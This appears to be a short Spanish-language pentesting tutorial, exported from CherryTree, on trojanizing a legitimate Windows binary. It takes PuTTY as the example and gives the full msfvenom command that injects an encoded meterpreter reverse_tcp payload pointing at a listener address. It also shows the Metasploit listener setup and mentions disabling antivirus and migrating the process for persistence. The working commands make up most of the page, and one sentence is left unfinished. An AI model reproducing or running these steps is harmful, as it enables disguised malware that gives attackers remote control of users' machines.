<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Backdoors en binarios</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Backdoors en binarios</h1><br/><p></p><p>Backdorizar un binario es util tanto en binarios de windows, linux e incluso mac con sus respectivas dificultades.</p><p></p><p>Consiste en coger un ejecutable, un programa legítimo que el usuario utilice de manera relativamente frecuente, y vamos a inyectarle código malicioso para que cada vez que ejecute ese programa nos devuelva una conexión reversa.</p><p></p><p>Pero ese programa funcionará de forma normal.</p><p></p><p>Hay que tener en cuenta los antivirus que pueden detectar.</p><p></p><p>Vamos a modificar el programa Putty.</p><p></p><p><div class="codebox"><pre><br /><span style="color:#000000;font-weight:700">wget</span> https<span style="color:#000000;font-weight:700">://</span>the.earth.li<span style="color:#000000;font-weight:700">/</span>~sgtatham<span style="color:#000000;font-weight:700">/</span>putty<span style="color:#000000;font-weight:700">/</span>0.78<span style="color:#000000;font-weight:700">/</span>w32<span style="color:#000000;font-weight:700">/</span>putty.exe</pre></div></p><p></p><p>Creamos el backdoor con msfvenom:</p><p></p><p><div class="codebox"><pre><br />msfvenom -a x86 --platform windows putty.exe -k -p windows<span style="color:#000000;font-weight:700">/</span>meterpreter<span style="color:#000000;font-weight:700">/</span>reverse_tcp lhost=192.168.16.140 lport=4445 -e x86<span style="color:#000000;font-weight:700">/</span>shikata_ga_nai -i3 -b <span style="color:#edd400;font-weight:400">&quot;\x00&quot;</span> -f exe -o puttyX.exe</pre></div></p><p></p><p>Los apartados -e -i es el tipo de codificación y las vueltas que realiza esta.</p><p></p><p>-b omite caracteres que puedan .</p><p></p><p><img src="images/146-1.png" alt="images/146-1.png" /></p><p></p><p>Ponemos a metasploit a escuchar.</p><p></p><p><img src="images/146-2.png" alt="images/146-2.png" /></p><p></p><p><div class="codebox"><pre><br /><span style="color:#000000;font-weight:700">set</span> payload windows<span style="color:#000000;font-weight:700">/</span>meterpreter<span style="color:#000000;font-weight:700">/</span>reverse_tcp</pre></div></p><p></p><p>Configuramos los demás parámetros y ponemos a escuchar.</p><p></p><p>En este caso va a ser detectado el binario como malicioso así que para realizar las pruebas desactivamos el antivirus.</p><p></p><p><img src="images/146-3.png" alt="images/146-3.png" /></p><p></p><p>Una de las técnicas en este punto es migrar el proceso a otro del sistema que se ejecute en segundo plano para ganar persistencia.</p><p></p></div>
</body>
</html>
